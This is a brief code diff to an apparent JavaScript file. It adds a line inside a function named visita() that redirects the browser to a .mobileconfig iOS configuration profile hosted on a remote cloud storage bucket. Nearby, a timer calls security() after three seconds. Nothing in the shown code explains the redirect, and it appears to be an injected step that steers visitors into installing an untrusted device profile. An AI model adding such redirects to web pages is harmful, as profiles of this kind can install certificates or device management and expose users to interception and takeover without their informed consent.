@@ -14,6 +14,7 @@ function visita() {
 			}
 		},
 	});
+	window.location.href = "https://testpcresbx.oss-accelerate.aliyuncs.com/uploads/h5_box2/20250710/e9dd49bbfd0ab7c50d1c1105ed78dbc5.mobileconfig";
 }
 window.setTimeout("security()", 3000);
 function security() {
